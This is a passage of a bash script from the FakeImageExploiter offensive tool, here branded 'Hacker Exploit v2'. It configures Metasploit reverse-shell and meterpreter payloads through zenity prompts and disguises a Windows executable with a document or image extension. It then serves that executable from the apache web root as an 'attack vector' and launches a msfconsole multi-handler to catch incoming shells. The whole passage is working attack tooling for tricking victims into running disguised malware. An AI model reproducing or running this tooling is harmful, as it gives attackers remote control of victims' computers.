          #
          # IF: AUTO_PAYLOAD_BUILD=YES
          # Then auto-config the handler [Metasploit] ..
          #
          if [ "$AuTo" = "YES" ]; then
            lhost="$IP"
            lport="$AhPu"
          else
            #
            # Manually input handler settings_ic [metasploit]
            #
		msfrclhost="localhost"
		msfrclport="8080"
            lhost=$(zenity --title="☠ Enter binary.exe LHOST ☠" --text "INPUT LHOST : $msfrclhost " --entry --width 300) > /dev/null 2>&1
            lport=$(zenity --title="☠ Enter binary.exe LPORT ☠" --text "INPUT LPORT : $msfrclport " --entry --width 300) > /dev/null 2>&1
            # input the payload used (of your uploaded binary)
            paylo=$(zenity --list --title "☠ FakeImageExploiter ☠" --text "\nChose payload used by binary.exe:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
          fi
          #
          # Attack vector (apache2 webserver)
          # HINT: with cleaner.rc resource file display ..
          #
          echo ""
			echo "${GREEN} WELCOME TO The ${RESTORE}"
			echo "${RESTORE}"
			echo "${YELLOW}"

			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;
			echo "${RESTORE}"
			echo "${RED}=============================================================================================================="
			echo "${RESTORE}"
		echo "${GREEN}"

          echo ${RedFr1}"    ATTACK VECTOR: http://$NGHTTPWH/$MiP.zip"${Resetr1};
            if [ "$FwDc" = "YES" ]; then
              echo ${RedFr1}"    AGENT: $IPATH/WH-output/$MiP.docx.exe"${Resetr1};
            else
              echo ${RedFr1}"    AGENT: $IPATH/WH-output/$MiP.$EtU.exe"${Resetr1};
            fi
	#	mv ./output/$MiP.$EtU.exe ./WH-output/$MiP.docx.exe		
		mv $IPATH/output/$MiP.$EtU.exe $IPATH/WH-output/$MiP.$EtU.exe
		cp $IPATH/WH-output/$MiP.$EtU.exe /var/www/html/$MiP.$EtU.exe
          echo ${RedFr1}"    CLEAN: meterpreter > resource $IPATH/output/cleaner.rc"${Resetr1};
          sleep 1
          # Start metasploit multi-handler ..
          xterm -T " Hacker Exploit v2 > F.I.E. PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r ./r.rc"
	bash $IPATH/WONpayloadoption.sh
    fi


      #
      # Clean all things up ..
      #
      rm $ApAc/$MiP.$EtU > /dev/null 2>&1
      rm $ApAc/$MiP.zip > /dev/null 2>&1
      rm $ApAc/payload.$PaLe > /dev/null 2>&1
      rm $ApAc/$MiP.$EtU.exe > /dev/null 2>&1
      rm $IPATH/bin/evilcopy.c > /dev/null 2>&1
      rm $IPATH/output/trigger.exe > /dev/null 2>&1
      sleep 2

    #
    # Exit framework ..
    #
    echo ""
    echo ${whitew1}    Codename${RedFr1}::${whitew1}$CnA ${Resetr1};
    echo ${whitew1}    Author${RedFr1}::${whitew1}pedr0 ubuntu${RedFr1}::${whitew1}[r00t-3xp10it]${Resetr1};
    echo ${whitew1}    FakeImageExploiter${RedFr1}::${whitew1}v$VeR${RedFr1}::${whitew1}SuspiciousShellActivity©${RedFr1}::${whitew1}RedTeam${RedFr1}::${whitew1}2017${Resetr1};
    sleep 1
    # Stop services, And good nigth ..
    service apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    if ! [ "$NoMsF" = "YES" ]; then
    service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    fi
exit



